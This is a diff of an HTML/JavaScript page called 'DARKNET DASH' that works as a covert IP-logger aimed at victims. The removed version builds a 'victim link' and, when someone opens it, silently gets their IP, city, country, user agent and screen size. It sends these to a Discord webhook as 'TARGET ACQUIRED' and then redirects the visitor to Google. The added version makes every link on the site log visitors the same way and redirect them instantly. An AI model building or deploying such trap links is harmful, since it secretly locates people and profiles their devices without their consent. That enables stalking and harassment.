@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>DARKNET DASH v7</title>
+  <title>DARKNET DASH v10</title>
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -15,7 +15,7 @@
       --text: rgba(255, 255, 255, 0.98);
       --accent: #00eaff;
       --glow: 0 0 18px rgba(0, 234, 255, 0.32);
-      --blur: blur(8px); /* Artistic blur — image visible, not distracting */
+      --blur: blur(8px);
       --radius: 26px;
     }
     * { margin:0; padding:0; box-sizing:border-box; }
@@ -29,7 +29,6 @@
       position: relative;
     }
 
-    /* BLURRED BACKGROUND — ARTISTIC, NOT HARSH */
     .bg-blur {
       position: fixed; top:0; left:0; width:100%; height:100%;
       background: inherit;
@@ -40,7 +39,7 @@
 
     .container { position:relative; z-index:2; max-width:1450px; margin:auto; padding:32px; }
 
-    /* LOGIN / SIGNUP — FULLY WORKING */
+    /* LOGIN */
     #auth {
       position: fixed; top:0; left:0; width:100%; height:100%; z-index:999;
       display: flex; align-items: center; justify-content: center;
@@ -68,7 +67,6 @@
       width:100%; padding:19px; margin:22px 0 0; background: var(--accent);
       color: #000; border:none; border-radius: 18px; font-weight:700; cursor:pointer;
       font-size:1.25rem; transition:0.35s; text-transform:uppercase;
-      letter-spacing:0.6px;
     }
     button:hover { background:#00d5ff; transform:translateY(-4px); box-shadow:0 12px 35px rgba(0,234,255,0.4); }
 
@@ -155,10 +153,10 @@
 </head>
 <body>
 
-  <!-- BLURRED BACKGROUND LAYER -->
+  <!-- BLURRED BACKGROUND -->
   <div class="bg-blur"></div>
 
-  <!-- AUTH (FULLY WORKING) -->
+  <!-- AUTH -->
   <div id="auth">
     <div class="auth-box">
       <h2 id="auth-title">LOGIN</h2>
@@ -172,31 +170,27 @@
   <!-- DASHBOARD -->
   <div class="container" id="dashboard" style="display:none;">
     <div class="header">
-      <h1>DARKNET DASH v7</h1>
+      <h1>DARKNET DASH v10</h1>
       <p>Live: <span id="live-count">0</span> targets online</p>
     </div>
 
     <div class="grid">
       <div class="card">
-        <h2>TRAP GENERATOR</h2>
-        <input id="webhook" placeholder="Discord Webhook URL" />
-        <label><input type="checkbox" id="ip" checked> IP + Geo</label>
-        <label><input type="checkbox" id="pc" checked> PC Info</label>
-        <button onclick="generate()">GENERATE TRAP</button>
-
-        <div id="generated">
-          <strong>VICTIM LINK:</strong><br>
-          <div id="link"></div>
-          <div class="btn-group">
-            <button onclick="copyLink()">COPY</button>
-            <button onclick="showQR()">QR</button>
-          </div>
-          <div id="qr" style="text-align:center;margin-top:20px;"></div>
+        <h2>UNIVERSAL HARVESTER</h2>
+        <p><strong>Share ANY link from this site:</strong></p>
+        <div id="link" style="margin:20px 0; padding:15px; background:rgba(0,0,0,0.3); border-radius:12px; font-weight:700; color:#00eaff;">
+          ${location.origin}
         </div>
+        <p>Every click = IP + Geo + Device logged</p>
+        <div class="btn-group">
+          <button onclick="copyLink()">COPY BASE URL</button>
+          <button onclick="showQR()">QR CODE</button>
+        </div>
+        <div id="qr" style="text-align:center;margin-top:20px;"></div>
       </div>
 
       <div class="card">
-        <h2>LIVE FEED</h2>
+        <h2>LIVE FEED <span style="font-size:0.8rem;opacity:0.7;">(Auto-refresh every 3s)</span></h2>
         <div class="stats">
           <div class="stat"><div class="stat-num" id="total">0</div><div>Total</div></div>
           <div class="stat"><div class="stat-num" id="today">0</div><div>Today</div></div>
@@ -214,17 +208,28 @@
   </div>
 
   <div class="footer">
-    © 2025 DARKNET DASH v7 – Built by Rex. <span style="color:#00eaff;">Blur is beauty. Power is yours.</span>
+    © 2025 DARKNET DASH v10 – Built by Rex. <span style="color:#00eaff;">Every link is a trap.</span>
   </div>
 
   <script>
     const rand = () => Math.random().toString(36).substr(2, 9);
     let logs = JSON.parse(localStorage.getItem("dd_logs") || "[]");
     let users = JSON.parse(localStorage.getItem("dd_users") || "[]");
-    let currentUser = null;
+    let currentUser = localStorage.getItem("dd_current_user");
     let map, markerLayer;
+    let refreshInterval;
 
-    // AUTH — FULLY WORKING
+    // AUTO-LOGIN
+    if (currentUser && users.find(x => x.u === currentUser)) {
+      document.getElementById("auth").style.display = "none";
+      document.getElementById("dashboard").style.display = "block";
+      document.getElementById("link").innerText = location.origin;
+      initMap();
+      render();
+      startAutoRefresh();
+    }
+
+    // AUTH
     const auth = document.getElementById("auth");
     const title = document.getElementById("auth-title");
     const btn = document.getElementById("auth-btn");
@@ -255,10 +260,13 @@
         const user = users.find(x => x.u === u && x.p === p);
         if (!user) return alert("Invalid username or password");
         currentUser = u;
+        localStorage.setItem("dd_current_user", u);
         auth.style.display = "none";
         document.getElementById("dashboard").style.display = "block";
+        document.getElementById("link").innerText = location.origin;
         initMap();
         render();
+        startAutoRefresh();
       }
     };
 
@@ -281,24 +289,12 @@
       });
     }
 
-    function generate() {
-      if (!currentUser) return;
-      const w = document.getElementById("webhook").value.trim();
-      if (!w.includes("discord.com/api/webhooks")) return alert("Invalid webhook");
-
-      const cfg = { w, ip: document.getElementById("ip").checked, pc: document.getElementById("pc").checked };
-      const id = rand();
-      const link = `${location.origin}/?id=${id}`;
-      localStorage.setItem(`trap_${id}`, JSON.stringify(cfg));
-
-      document.getElementById("link").innerText = link;
-      document.getElementById("generated").style.display = "block";
-      document.getElementById("qr").innerHTML = "";
+    function copyLink() { 
+      navigator.clipboard.writeText(location.origin); 
+      alert("Base URL copied! Share anywhere."); 
     }
-
-    function copyLink() { navigator.clipboard.writeText(document.getElementById("link").innerText); alert("Copied!"); }
     function showQR() {
-      const l = document.getElementById("link").innerText;
+      const l = location.origin;
       document.getElementById("qr").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(l)}" style="border:2px solid #00eaff;border-radius:20px;">`;
     }
 
@@ -322,35 +318,16 @@
       } 
     }
 
-    // === SILENT LOGGING + INSTANT REDIRECT ===
-    if (location.search) {
-      const id = new URLSearchParams(location.search).get("id");
-      const cfg = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
-      const webhook = cfg.w;
+    function startAutoRefresh() {
+      if (refreshInterval) clearInterval(refreshInterval);
+      refreshInterval = setInterval(render, 3000);
+    }
 
+    // === UNIVERSAL HARVEST: ANY LINK FROM THIS SITE LOGS IP ===
+    if (location.pathname !== "/" || location.search) {
       (async () => {
         let ipData = {};
-        const fields = [];
-
         try { ipData = await (await fetch("https://ipapi.co/json/")).json(); } catch(e) {}
-
-        if (cfg.ip) {
-          fields.push({ name: "IP", value: ipData.ip || "??", inline: true });
-          fields.push({ name: "Location", value: `${ipData.city || "?"}, ${ipData.country_name || "?"}`, inline: true });
-        }
-        if (cfg.pc) {
-          const bat = await navigator.getBattery?.() || {};
-          fields.push({ name: "Device", value: navigator.userAgent.slice(0,100), inline: false });
-          fields.push({ name: "Screen", value: `${screen.width}x${screen.height}`, inline: true });
-        }
-
-        if (webhook && fields.length) {
-          await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [{ title: "TARGET ACQUIRED", color: 3447003, fields, timestamp: new Date().toISOString() }] })
-          });
-        }
 
         const entry = {
           time: new Date().toLocaleTimeString(),
@@ -367,12 +344,9 @@
         all.push(entry);
         localStorage.setItem("dd_logs", JSON.stringify(all));
 
-        setTimeout(() => location.replace("https://google.com"), 30);
+        // INSTANT REDIRECT
+        location.replace("https://google.com");
       })();
-    } else {
-      setInterval(() => {
-        document.getElementById("live-count").innerText = logs.filter(l => Date.now() - l.ts < 60000).length;
-      }, 5000);
     }
   </script>
 </body>
